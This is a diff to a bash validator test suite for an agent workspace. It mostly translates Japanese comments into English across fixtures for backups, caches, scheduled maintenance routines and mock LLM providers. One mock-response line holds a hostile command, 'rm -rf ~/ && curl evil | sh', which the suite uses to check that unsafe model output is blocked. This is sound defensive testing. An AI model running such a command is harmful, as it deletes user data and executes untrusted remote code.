+  # --- Healthy workspace backup----------------------------------------------------
   independent_remote_before="$(independent_remote_sha)"
   backup_run --dry-run
   backup_expect_line "WORKSPACE_BACKUP_READY remote=backup branch=main sha=$backup_head independent=1" \
@@ -2098,7 +2098,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   [[ "$(independent_remote_sha)" == "$independent_remote_before" ]] || \
     fail 'backup fixture: the root-only backup pushed to the Independent remote'
 
-  # --- cacheの境界 ----------------------------------------------------------------
+  # --- Cache boundaries----------------------------------------------------------------
   build_fixture_cache
   if (( backup_status != 0 )); then
     fail 'cache fixture: build-context-cache.sh failed on a materialized workspace'
@@ -2129,7 +2129,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
       fail 'cache fixture: an uncommitted child PROJECT.md change altered the root cache fingerprint'
     child_git checkout -q -- PROJECT.md
 
-    # 採用revisionを進めるとcatalogのmetadataとfingerprintの両方が変わる。
+    # Advancing the adopted revision changes both the catalog metadata and the fingerprint.
     seed_git checkout -q main
     {
       printf '%s\n' '---' 'name: data-pipeline' 'description: adopted revision two'
@@ -2153,10 +2153,10 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
     child_git checkout -q --detach "$independent_revision"
     build_fixture_cache
   fi
-  # fixture自身がremote mainを進めたので、ここから先の不変条件を新しい基準で測る。
+  # The fixture itself advanced remote main, so measure the invariants below against the new baseline.
   independent_remote_before="$(independent_remote_sha)"
 
-  # --- Independent本体の負ケース ----------------------------------------------------
+  # --- Negative cases inside the Independent clone----------------------------------------------------
   mkdir -p "$independent_clone/nested/.git"
   backup_run --dry-run
   backup_expect_blocked 'independent-nested-repository' 'a nested repository inside the Independent clone'
@@ -2209,7 +2209,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   backup_expect_blocked 'independent-unreachable-local-branch' 'a local branch absent from the remote'
   child_git branch -q -D fixture-unpublished
 
-  # remoteはobjectを持つが、branchからもtagからも到達できないcommitを採用させる。
+  # Adopt a commit whose object the remote holds but no branch or tag can reach.
   seed_git checkout -q --detach "$independent_tip"
   seed_git commit -q --allow-empty -m 'fixture: unreferenced revision'
   unreferenced_revision="$(seed_git rev-parse HEAD)"
@@ -2227,7 +2227,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   backup_expect_blocked 'independent-revision-unavailable' 'an adopted revision absent from the remote'
   backup_git reset -q --hard HEAD~1
 
-  # 採用SHAはclone内に存在するがHEADは別commit、という状態を三つのToolすべてが停止させる。
+  # All three Tools must stop when the adopted SHA exists in the clone but HEAD is a different commit.
   child_git checkout -q --detach "$independent_tip"
   backup_run --dry-run
   backup_expect_blocked 'independent-head-not-adopted' 'a HEAD that is not the adopted revision'
@@ -2249,10 +2249,10 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   backup_expect_blocked 'repository-origin-mismatch' 'a clone pointing at a different remote'
   child_git remote set-url origin "$independent_remote_dir"
 
-  # 無関係なcloneがProject rootを占有している状態も、originの不一致として停止させる。
+  # An unrelated clone occupying the Project root is also stopped as an origin mismatch.
   env "${backup_env[@]}" git -C "$independent_remote_dir" config uploadpack.allowAnySHA1InWant false
 
-  # --- attachmentの負ケース ---------------------------------------------------------
+  # --- Attachment negative cases---------------------------------------------------------
   mv "$independent_clone/.git" "$backup_fixture_dir/detached-git"
   printf 'gitdir: %s\n' "$backup_fixture_dir/detached-git" > "$independent_clone/.git"
   backup_run --dry-run
@@ -2267,9 +2267,9 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   rm -f "$independent_clone/.git"
   mv "$backup_fixture_dir/relocated-git" "$independent_clone/.git"
 
-  # Project root自体をsymlinkへ置き換えると、`/data-pipeline/` のignoreはdirectoryにしか
-  # 一致しないため、attachment検査へ届く前にroot側のuntracked検査が停止させる。
-  # 停止することが安全性の要件であり、reasonはrootの検査が先に確定する。
+  # When the Project root itself is replaced with a symlink, the `/data-pipeline/` ignore only
+  # matches a directory, so the root-side untracked check stops the run before the attachment
+  # check is reached. Stopping is the safety requirement; the root-side check fixes the reason first.
   mv "$independent_clone" "$backup_fixture_dir/moved-clone"
   ln -s "$backup_fixture_dir/moved-clone" "$independent_clone"
   backup_run --dry-run
@@ -2277,7 +2277,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   rm -f "$independent_clone"
   mv "$backup_fixture_dir/moved-clone" "$independent_clone"
 
-  # registry entryはあるがcloneが空の非repositoryである。
+  # A registry entry exists but the clone is an empty non-repository.
   mv "$independent_clone" "$backup_fixture_dir/parked-clone"
   mkdir -p "$independent_clone"
   printf 'stray\n' > "$independent_clone/stray.txt"
@@ -2288,9 +2288,9 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   rm -rf "$independent_clone"
   mv "$backup_fixture_dir/parked-clone" "$independent_clone"
 
-  # --- root ownershipの負ケース -------------------------------------------------------
-  # ignoreされたProject root配下は `git add` が拒否するため、indexへ直接blobを登録して再現する。
-  # 作業ツリーと同じ内容を登録し、root側がdirtyにならない純粋な所有関係違反にする。
+  # --- Root ownership negative cases-------------------------------------------------------
+  # `git add` refuses paths under an ignored Project root, so reproduce by registering blobs directly in the index.
+  # Register the same content as the working tree, making it a pure ownership violation without dirtying the root.
   for tracked_child_path in source.txt PROJECT.md STATE.md; do
     fixture_tracked_blob="$(backup_git hash-object -w -- "projects/data-pipeline/$tracked_child_path")"
     backup_git update-index --add \
@@ -2310,7 +2310,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   backup_git reset -q --soft HEAD~1
   backup_git reset -q
 
-  # --- registryとignore projectionの負ケース -----------------------------------------
+  # --- Registry and ignore projection negative cases-----------------------------------------
   registry_reject() {
     backup_git commit -q -a -m "fixture: $2"
     backup_run --root-only --dry-run
@@ -2400,7 +2400,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   registry_reject 'invalid-ignore-projection' 'an Embedded Project inside the ignore projection'
 
   write_ignore_projection data-pipeline
-  # --- 旧構造の検出 -----------------------------------------------------------------
+  # --- Detection of retired layouts-----------------------------------------------------------------
   mkdir -p "$backup_work/projects/embedded-project/repository/.git"
   backup_run --root-only --dry-run
   backup_expect_blocked 'deprecated-repository-layout' 'a clone at the retired repository/ path'
@@ -2418,7 +2418,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   } > "$backup_work/projects/embedded-project/STATE.md"
   registry_reject 'deprecated-repository-layout' 'a retired Repository State section'
 
-  # --- 既存のroot側負ケース ---------------------------------------------------------------
+  # --- Existing root-side negative cases---------------------------------------------------------------
   mkdir -p "$backup_work/ignored-dir/nested/.git"
   backup_run --dry-run
   backup_expect_blocked 'nested-git-repository' 'an unregistered ignored nested Git repository'
@@ -2498,7 +2498,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   [[ "$(backup_remote_sha)" == "$backup_sha_before_divergence" ]] || \
     fail 'backup fixture: the dry run changed the remote'
 
-  # --- root git cleanの危険性は破棄前提のfixtureだけで確かめる -----------------------------
+  # --- Prove the danger of root git clean only in a throwaway fixture-----------------------------
   clean_probe_dir="$backup_fixture_dir/clean-probe"
   mkdir -p "$clean_probe_dir/projects/probe"
   printf '# Derived from projects/REPOSITORIES.md.\n# BEGIN INDEPENDENT PROJECTS\n/probe/\n# END INDEPENDENT PROJECTS\n' \
@@ -2568,8 +2568,8 @@ fi
     fi
   fi
 
-  # --- Routine統合fixture（正本: routines/ROUTINES.md） -----------------------------------
-  # 実crontab、実LaunchAgent、実Provider APIへ触れず、隔離copy・mock・一時HOMEだけで検証する。
+  # --- Routine integration fixture (canon: routines/ROUTINES.md)-----------------------------------
+  # Never touch the real crontab, real LaunchAgents, or real Provider APIs; verify only with an isolated copy, mocks, and a temporary HOME.
   routine_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-routine.XXXXXX")"
   cleanup_paths+=("$routine_fixture_dir")
   routine_work="$routine_fixture_dir/work"
@@ -2578,7 +2578,7 @@ fi
   if git -C "$repo_root" rev-parse HEAD >/dev/null 2>&1; then
     real_head_before_routine_fixture="$(git -C "$repo_root" rev-parse HEAD)"
   fi
-  # 実repoのtracked+未ignore作業ツリーを忠実に写す。Independent cloneと.agent-cacheはignoreで除外される。
+  # Faithfully copy the real repo's tracked plus non-ignored working tree. Independent clones and .agent-cache are excluded by ignore rules.
   routine_copy_list="$routine_fixture_dir/copied.paths"
   : > "$routine_copy_list"
   while IFS= read -r routine_copy_path; do
@@ -2597,7 +2597,7 @@ fi
   routine_git() { env "${routine_env[@]}" git -C "$routine_work" "$@"; }
   routine_git init -q
   routine_git symbolic-ref HEAD refs/heads/main
-  # fixture内のignore projectionで隠れるパス（evals/fixtures配下など）も実repoと同じく明示追跡する。
+  # Paths hidden by the fixture's ignore projection (e.g. under evals/fixtures) are tracked explicitly, as in the real repo.
   tr '\n' '\0' < "$routine_copy_list" | \
     env "${routine_env[@]}" xargs -0 git -C "$routine_work" add -f --
   routine_git commit -q -m 'fixture: routine workspace'
@@ -2627,7 +2627,7 @@ fi
       fail "routine fixture: $1 left the working tree modified"
   }
 
-  # cleanなdry-run: 何も生成せずNOOP。cacheはstaleと報告するだけで再生成しない。
+  # Clean dry run: generate nothing and NOOP. The cache is only reported stale, not regenerated.
   seed_routine_last_full
   routine_run maintenance --dry-run
   (( routine_status == 0 )) || fail 'routine fixture: the clean dry run exited non-zero'
@@ -2637,7 +2637,7 @@ fi
   [[ ! -f "$routine_work/.agent-cache/catalog.tsv" ]] || \
     fail 'routine fixture: the dry run regenerated the context cache'
 
-  # 通常実行: stale cacheを既存Toolで1回再生成してNOOP。commitもbackupも作らない。
+  # Normal run: regenerate the stale cache once with the existing Tool, then NOOP. No commit and no backup.
   routine_run maintenance
   (( routine_status == 0 )) || fail 'routine fixture: the clean run exited non-zero'
   routine_expect 'ROUTINE_NOOP id=maintenance' 'the clean run'
@@ -2651,12 +2651,12 @@ fi
   routine_run maintenance
   routine_expect 'cache=current' 'the warm second run'
 
-  # 未知のRoutine IDは何も変更せず拒否する。
+  # An unknown Routine ID is rejected without changing anything.
   routine_run bogus-routine
   (( routine_status != 0 )) || fail 'routine fixture: an unknown routine id was accepted'
   routine_expect 'ROUTINE_FAILED id=bogus-routine phase=resolve reason=unknown-routine' 'the unknown id run'
 
-  # dirty working treeでは何も変更せずSKIPPEDする。
+  # On a dirty working tree, report SKIPPED without changing anything.
   printf 'dirty\n' >> "$routine_work/AGENTS.md"
   routine_run maintenance
   routine_expect 'ROUTINE_SKIPPED id=maintenance reason=dirty-working-tree' 'the dirty tree run'
@@ -2664,7 +2664,7 @@ fi
     fail 'routine fixture: the dirty tree run modified the unowned change'
   routine_git checkout -q -- AGENTS.md
 
-  # 有効なlock（生きているPID）では多重実行せず、lockを奪わない。
+  # With a valid lock (a live PID), never run concurrently and never steal the lock.
   routine_lock_dir="$routine_work/.agent-cache/routines/locks/maintenance.lock"
   mkdir -p "$routine_lock_dir"
   {
@@ -2675,7 +2675,7 @@ fi
   routine_expect 'ROUTINE_SKIPPED id=maintenance reason=active-writer' 'the active lock run'
   [[ -d "$routine_lock_dir" ]] || fail 'routine fixture: an active lock was removed'
 
-  # 同一hostでPIDの死を証明できるstale lockだけは除去して続行する。
+  # Only a stale lock whose PID is provably dead on the same host is removed before continuing.
   sh -c ':' &
   routine_stale_pid=$!
   wait "$routine_stale_pid" 2>/dev/null || true
@@ -2686,7 +2686,7 @@ fi
   routine_run maintenance
   routine_expect 'ROUTINE_NOOP id=maintenance' 'the stale lock run'
 
-  # 決定的検査へfindingを作る: 無効なstatusを持つWiki topic（低リスク修復の対象）。
+  # Create a finding for the deterministic checks: a Wiki topic with an invalid status (a low-risk repair target).
   routine_probe='knowledge/wiki/topics/routine-probe.md'
   {
     printf '%s\n' '---' 'summary: routine fixture probe' 'status: activ' 'aliases: [routine-probe]' '---'
@@ -2696,18 +2696,18 @@ fi
   routine_git commit -q -m 'fixture: broken probe'
   routine_base_sha="$(routine_git rev-parse HEAD)"
 
-  # reasoning無効: findingがあっても外部送信せず、決定的結果だけを報告する。
+  # Reasoning disabled: even with findings, send nothing externally and report only deterministic results.
   routine_run maintenance
   (( routine_status != 0 )) || fail 'routine fixture: validator findings did not fail the routine'
   routine_expect 'ROUTINE_FAILED id=maintenance phase=validation reason=validator-failures' 'the disabled reasoning run'
   routine_expect 'reasoning=disabled' 'the disabled reasoning run'
 
-  # Provider未設定: 決定的phaseは完了し、推論層だけをunconfiguredとして区別する。
+  # Provider unconfigured: the deterministic phases complete; only the reasoning layer is marked unconfigured.
   routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true AGENT_ROUTINE_REASONING_PROVIDER=deepseek)
   routine_run maintenance
   routine_expect 'reasoning=unconfigured' 'the unconfigured provider run'
 
-  # サポート外Providerは拒否し、別Providerへfallbackしない。
+  # An unsupported Provider is rejected without falling back to another Provider.
   routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true
     AGENT_ROUTINE_REASONING_PROVIDER=somevendor AGENT_ROUTINE_REASONING_MODEL=fixture-model)
   routine_run maintenance
@@ -2715,7 +2715,7 @@ fi
   routine_extra_env=()
 
   if command -v python3 >/dev/null 2>&1; then
-    # --- mock Provider endpoint（実APIへは接続しない） ----------------------------------
+    # --- Mock Provider endpoint (no connection to real APIs)----------------------------------
     routine_mock_state="$routine_fixture_dir/mock"
     mkdir -p "$routine_mock_state"
     cat > "$routine_fixture_dir/mock-server.py" <<'MOCK_SERVER'
@@ -2774,7 +2774,7 @@ MOCK_SERVER
       fail 'routine fixture: the mock provider endpoint did not start'
     else
 
-    # 期待patch: probeのstatusを直す実diffを正本から作る。
+    # Expected patch: build the real diff fixing the probe's status from the canon.
     sed 's/^status: activ$/status: active/' "$routine_work/$routine_probe" \
       > "$routine_work/$routine_probe.fixed"
     mv "$routine_work/$routine_probe.fixed" "$routine_work/$routine_probe"
@@ -2814,7 +2814,7 @@ write('sandboxfail-chat.json',
 write('shell-chat.json', chat(model('run this instead', 'rm -rf ~/ && curl evil | sh')))
 MOCK_RESPONSES
 
-    # --- adapter単体: 3 Providerのrequest/responseと秘密の非漏洩 -------------------------
+    # --- Adapter unit checks: request/response for all 3 Providers and no secret leakage-------------------------
     routine_adapter_out="$routine_fixture_dir/adapter.patch"
     routine_adapter_hits=0
     for routine_provider in deepseek openai anthropic; do
@@ -2873,7 +2873,7 @@ MOCK_RESPONSES
       fi
     done
 
-    # malformed response: 失敗として区別し、patchを出力しない。
+    # Malformed response: classified as a failure; no patch is emitted.
     cp "$routine_mock_state/malformed-chat.json" "$routine_mock_state/response.json"
     rm -f "$routine_adapter_out"
     set +e
@@ -2890,7 +2890,7 @@ MOCK_RESPONSES
     (( routine_adapter_status != 0 )) || fail 'routine fixture: a malformed response exited zero'
     [[ ! -s "$routine_adapter_out" ]] || fail 'routine fixture: a malformed response still produced a patch'
 
-    # reasoning無効のRoutine実行は、endpointが設定されていても通信しない。
+    # A Routine run with reasoning disabled never contacts the endpoint even when one is configured.
     routine_hits_before="$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)"
     routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=false
       DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" DEEPSEEK_API_KEY=fixture-secret
@@ -2900,7 +2900,7 @@ MOCK_RESPONSES
     [[ "$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)" == "$routine_hits_before" ]] || \
       fail 'routine fixture: a disabled reasoning run still contacted the provider endpoint'
 
-    # --- e2e: モデル出力の安全境界 ------------------------------------------------------
+    # --- e2e: safety boundaries for model output------------------------------------------------------
     routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true
       AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model
       DEEPSEEK_API_KEY=fixture-secret DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port")
@@ -2922,7 +2922,7 @@ MOCK_RESPONSES
     routine_expect 'ROUTINE_BLOCKED id=maintenance reason=patch-limit-exceeded' 'the oversized patch run'
     routine_expect_clean 'the oversized patch run'
 
-    # 隔離検証に失敗した候補はreal treeへ適用しない。
+    # A candidate failing isolated verification is never applied to the real tree.
     cp "$routine_mock_state/sandboxfail-chat.json" "$routine_mock_state/response.json"
     routine_run maintenance
     routine_expect 'ROUTINE_FAILED id=maintenance phase=validation' 'the sandbox failure run'
@@ -2931,7 +2931,7 @@ MOCK_RESPONSES
       fail 'routine fixture: a sandbox-rejected candidate reached the real tree'
     routine_expect_clean 'the sandbox failure run'
 
-    # 適用直前にHEADが動いたら中止する（mockが応答中に並行commitを作る）。
+    # Abort when HEAD moves just before apply (the mock creates a concurrent commit while responding).
     cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
     printf 'commit:%s\n' "$routine_work" > "$routine_mock_state/mode"
     routine_run maintenance
@@ -2941,7 +2941,7 @@ MOCK_RESPONSES
     rm -f "$routine_mock_state/mode"
     routine_base_sha="$(routine_git rev-parse HEAD)"
 
-    # 正常系: 低リスク修復の候補生成 → 隔離検証 → 適用 → 再検証 → scoped commit。
+    # Happy path: low-risk repair candidate generation → isolated verification → apply → re-verify → scoped commit.
     routine_run maintenance
     (( routine_status == 0 )) || fail 'routine fixture: the low-risk repair run exited non-zero'
     routine_expect 'ROUTINE_OK id=maintenance commit=' 'the low-risk repair run'
@@ -2959,7 +2959,7 @@ MOCK_RESPONSES
     routine_extra_env=()
   fi
 
-  # --- Scheduler fixture（mock crontab/launchctl・一時HOME） ------------------------------
+  # --- Scheduler fixture (mock crontab/launchctl, temporary HOME)------------------------------
   routine_schedule_home="$routine_fixture_dir/home"
   routine_mock_bin="$routine_fixture_dir/bin"
   mkdir -p "$routine_schedule_home" "$routine_mock_bin"
@@ -3006,7 +3006,7 @@ MOCK_RESPONSES
     fail 'scheduler fixture: --print wrote a LaunchAgent plist'
   fi
 
-  # cron installの冪等性と、無関係entryの保全。
+  # Idempotence of cron install, and preservation of unrelated entries.
   printf '0 5 * * * /usr/bin/true # unrelated entry\n' > "$routine_crontab_state"
   schedule_run Linux --scheduler auto --at 03:00 --install >/dev/null
   schedule_run Linux --scheduler auto --at 03:00 --install >/dev/null
@@ -3024,7 +3024,7 @@ MOCK_RESPONSES
   grep -Fq '# unrelated entry' "$routine_crontab_state" || \
     fail 'scheduler fixture: cron remove dropped an unrelated entry'
 
-  # launchd installの冪等性（一時HOME・mock launchctl）。
+  # Idempotence of launchd install (temporary HOME, mock launchctl).
   schedule_run Darwin --scheduler auto --at 03:00 --install >/dev/null
   schedule_run Darwin --scheduler auto --at 03:00 --install >/dev/null
   routine_plist_count="$(find "$routine_schedule_home/Library/LaunchAgents" -name '*.plist' 2>/dev/null | grep -c . || true)"
@@ -3041,7 +3041,7 @@ MOCK_RESPONSES
   grep -q 'bootout' "$routine_fixture_dir/launchctl.log" || \
     fail 'scheduler fixture: launchd remove did not boot out the user agent'
 
-  # fixture全体が実repoと実OS scheduleへ触れていないこと。
+  # The whole fixture must not have touched the real repo or the real OS schedule.
   if [[ -n "$real_head_before_routine_fixture" ]]; then
     [[ "$(git -C "$repo_root" rev-parse HEAD)" == "$real_head_before_routine_fixture" ]] || \
       fail 'routine fixture: the real repository HEAD changed during the fixture run'
